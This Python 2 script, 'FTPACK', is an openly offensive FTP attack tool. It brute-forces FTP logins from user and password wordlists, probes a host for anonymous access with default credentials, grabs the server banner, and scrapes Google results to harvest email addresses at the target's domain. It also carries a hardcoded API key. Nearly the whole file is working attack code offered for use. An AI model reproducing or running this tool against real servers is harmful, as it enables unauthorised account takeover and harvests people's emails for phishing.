#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       untitled.py
#       
#       Copyright 2013 Juan Sebastian Eljach <juan_eljach10@hotmail.com>
#       
#       This program is free software; you can redistribute it and/or modify
#       it under the terms of the GNU General Public License as published by
#       the Free Software Foundation; either version 2 of the License, or
#       (at your option) any later version.
#       
#    This program is free software: you can redistribute it and/or modify 
#    it under the terms of the GNU General Public License as published by   
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version. 
#   
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of 
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.         
#                                                         
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>  

import ftplib
import os
import socket
import sys
import urllib
import wcolors
from optparse import OptionParser
import myparser
import re
import string
import httplib
import time

if "linux" in sys.platform:
	os.system("clear")
elif "win" in sys.platform:
	os.system("cls")
else:
	pass

class search_google:
	def __init__(self,word,limit,start):
		self.word=word
		self.files=""
		self.results=""
		self.totalresults=""
		self.server="www.google.com"
		self.hostname="www.google.com"
		self.userAgent="(Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6"
		self.quantity="100"
		self.limit=limit
		self.counter=start
		self.api_key="AIzaSyBuBomy0n51Gb4836isK2Mp65UZI_DrrwQ"
		
	def do_search(self):
		h = httplib.HTTP(self.server)
		h.putrequest('GET', "/search?num="+self.quantity+"&start=" + str(self.counter) + "&hl=en&meta=&q=%40\"" + self.word + "\"")
		h.putheader('Host', self.hostname)
		h.putheader('User-agent', self.userAgent)	
		h.endheaders()
		returncode, returnmsg, headers = h.getreply()
		self.results = h.getfile().read()
		self.totalresults+= self.results
						
	def get_emails(self):
		rawres=myparser.parser(self.totalresults,self.word)
		return rawres.emails()
		
	def process(self):
		while self.counter <= self.limit and self.counter <= 1000:
			self.do_search()
			#more = self.check_next()
			time.sleep(1)
			print "\t[*]Searching "+ str(self.counter) + " results..."
			self.counter+=100



#so far By Chris Martorella

class color:
	PURPLE = '\033[95m'
	CYAN = '\033[96m'
	DARKCYAN = '\033[36m'
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	BOLD = '\033[1m'
	UNDERL = '\033[4m'
	ENDC = '\033[0m'
	backBlack = '\033[40m'
	backRed = '\033[41m'
	backGreen = '\033[42m'
	backYellow = '\033[43m'
	backBlue = '\033[44m'
	backMagenta = '\033[45m'
	backCyan = '\033[46m'
	backWhite = '\033[47m'
	
print color.BLUE + "\t\t************FTPACK**************" + color.ENDC
print color.BLUE + "\t\t**                            **" + color.ENDC
print color.BLUE + "\t\t** Developed By: @juan_eljach **" + color.ENDC
print color.BLUE + "\t\t**                            **" + color.ENDC
print color.BLUE + "\t\t********************************"

global_options = ["0.0.0.0",21]


def fingerprinting():
	url = socket.gethostbyaddr(global_options[0])[0]
	print color.GREEN + "\n[*]Starting Fingerprinting to: "+url[4:] + color.ENDC
	search = search_google(url[4:],500,0)
	search.process()
	all_emails = search.get_emails()
	if all_emails == []:
		print color.RED + "[*]Emails not found" + color.ENDC
	else:
		emails_file = "emails.txt"
		emails = open(emails_file,"w")
		for x in all_emails:
			emails.write(x+"\n")

	if emails_file:
		print color.GREEN + "\n[*]Emails Saved in: " + emails_file + color.ENDC
	else:
		pass
def brute():
	try:
		ud = open(global_options[2],"r")
		pd = open(global_options[3],"r")
			
		users = ud.readlines()
		passwords = pd.readlines()
			
		for user in users:
			for password in passwords:
				try:
					print wcolors.color.GREEN + "[*]Trying to connect" + wcolors.color.ENDC
					conect = ftplib.FTP(global_options[0])
					ans = conect.login(user,password)
					if ans == "230 Login successful.":
						print "User: ", user
						print "Password: ",password
					else:
						pass
				except ftplib.error_perm:
					print wcolors.color.RED + "Can't Brute Force" + wcolors.color.ENDC
					conect.close
			
	except(KeyboardInterrupt):
		print "Interrupted. Later!"
		sys.exit()
			
def scan():
	try:
		users = ["anonymous","anonymous"+"@"+global_options[0]]
		passwords = ["guest","anonymous"," ","anonymous"+"@"+global_options[0]]
	
		print color.GREEN + "[*]Wait Please\n" + color.ENDC
		print color.GREEN + "[*]IP: " + global_options[0] + color.ENDC
		print color.GREEN + "[*]Port: " + str(global_options[1]) + color.ENDC
		
		for user in users:
			for password in passwords:
				try:
					try:
						conect = ftplib.FTP(global_options[0])
					except socket.error:
						print color.RED + "[*]Can't conect to FTP" + color.ENDC
						sys.exit()
					ans = conect.login(user,password)
					if ans == "230 Login successful.":
						anon_login = "Allowed"
						global_options.insert(2, anon_login)
					else:
						pass
				except ftplib.error_perm:
					anon_login = "Disallowed"
					global_options.insert(2, anon_login)
		
		print color.GREEN + "[*]Anonymous Access: " + global_options[2] + " (May be)" + color.ENDC
		socket.setdefaulttimeout(2)
		s = socket.socket()
		try:
			s.connect((global_options[0],global_options[1]))
			ans_socket = s.recv(1024)
			global_options.insert(4, ans_socket)
			print color.GREEN + "[*]FTP Banner: " + global_options[4] + color.ENDC
			s.close()
		except(socket.error):
			pass
					
		print color.GREEN + "[*]URL: " + socket.gethostbyaddr(global_options[0])[0] + color.ENDC	
		
	except(KeyboardInterrupt):
		print "Interrupted. Later!"
		sys.exit()


parser = OptionParser()
parser.add_option("-i", type="string", dest="ip",
                  help="Host to scan", metavar="IP")
parser.add_option("-p", type="int", dest="port",
                  help="Port in Host to scan", metavar="Port")
parser.add_option("--users", type="string", dest="users",
                  help="txt Users Dictionary for Brute Force", metavar="USERS")
parser.add_option("--passwords", type="string", dest="passwd",
                  help="txt Passwords Dictionary for Brute Force", metavar="PASS")
parser.add_option("--scan", dest="scanHost",
                  action="store_true",
                  help="Start scan")
parser.add_option("--brute", dest="bruteAttack",
                  action="store_true",
                  help="Start Brute Force Attack")
parser.add_option("--finger", dest="fingerAttack",
                  action="store_true",
                  help="Start Fingerprintin")                                    


(options, args) = parser.parse_args()

if options.ip:
	global_options[0] = options.ip
else:
	print color.RED + "\n[*]Error: " + color.ENDC + "missing a mandatory option. use -h for help\n"
if options.port:
	global_options[1] = options.port
else:
	pass
	
if options.ip and options.port and options.users and options.passwd and options.bruteAttack:
	global_options.insert(2, options.users)
	global_options.insert(3, options.passwd)
	brute()
else:
	pass
if options.ip and options.port and options.scanHost:
	scan()
else:
	pass
if options.ip and options.fingerAttack:
	fingerprinting()
else:
	pass

